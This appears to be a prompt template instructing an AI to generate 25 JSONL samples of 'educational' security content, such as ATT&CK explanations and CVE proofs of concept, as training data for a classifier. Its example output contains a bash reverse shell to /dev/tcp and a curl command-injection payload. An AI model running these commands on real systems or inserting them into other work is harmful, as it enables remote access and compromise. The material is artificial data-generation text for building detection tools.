# Task: Generate Advanced Educational Security Content

You are generating training data for a machine learning model. Generate sophisticated EDUCATIONAL security content covering advanced attack techniques explained in documentation style.

Generate **25 unique samples** - these should NOT be blocked because they are clearly educational.

## Output Format

Output valid JSONL (one JSON object per line). Do NOT include any other text, explanations, or markdown formatting - ONLY the JSONL lines:

```
{"text": "content here", "label": "educational", "segment_type": "code"}
```

## Topics to Cover (5 samples each)

### 1. MITRE ATT&CK Technique Explanations
- Reference real technique IDs: T1059 (Command and Scripting), T1105 (Ingress Tool Transfer), T1071 (Application Layer Protocol)
- Include technique name, description, example code, detection, mitigation

### 2. CVE Descriptions with PoC Code
- Reference CVE format: CVE-2023-XXXXX (use fictional numbers)
- Include vulnerability description, affected systems, proof-of-concept code, remediation

### 3. Penetration Testing Tutorials
- Ethical hacking education
- Red team methodology explanations
- Include disclaimers about authorized testing only

### 4. Incident Response Documentation
- "We observed attackers using..." 
- "The threat actor executed..."
- Post-incident analysis style

### 5. Security Research Papers
- Academic/research paper style
- Analysis of malware techniques
- Code samples with detailed explanations

## Requirements

- MUST include warning language or educational framing
- Code blocks with dangerous commands
- Explain the attack mechanism technically
- Include defensive recommendations or mitigations
- Use proper newlines with \n in JSON strings

## Example Output Format

```jsonl
{"text": "### MITRE ATT&CK: T1059.004 - Unix Shell\n\n**Description:** Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems.\n\n**Example (DO NOT EXECUTE - For educational purposes only):**\n\n```bash\n/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n```\n\nThis creates a reverse shell connection to an attacker-controlled server.\n\n**Detection:** Monitor for unusual bash processes with network connections. Look for /dev/tcp usage.\n\n**Mitigation:** Restrict shell access, implement command logging, use application allowlisting.", "label": "educational", "segment_type": "code"}
{"text": "## CVE-2023-44127: Remote Code Execution via Curl\n\n**Severity:** Critical (CVSS 9.8)\n\n**Description:** A vulnerability in the update mechanism allows attackers to inject malicious commands.\n\n**Proof of Concept (WARNING: Do not run against production systems):**\n\n```bash\ncurl -k https://vulnerable-server.com/update?cmd=$(whoami)\n```\n\n**Impact:** Complete system compromise.\n\n**Remediation:** Update to version 2.1.5 or later. Apply input validation on the cmd parameter.", "label": "educational", "segment_type": "code"}
```

---

**OUTPUT ONLY JSONL LINES - NO OTHER TEXT**

Generate 25 samples now:

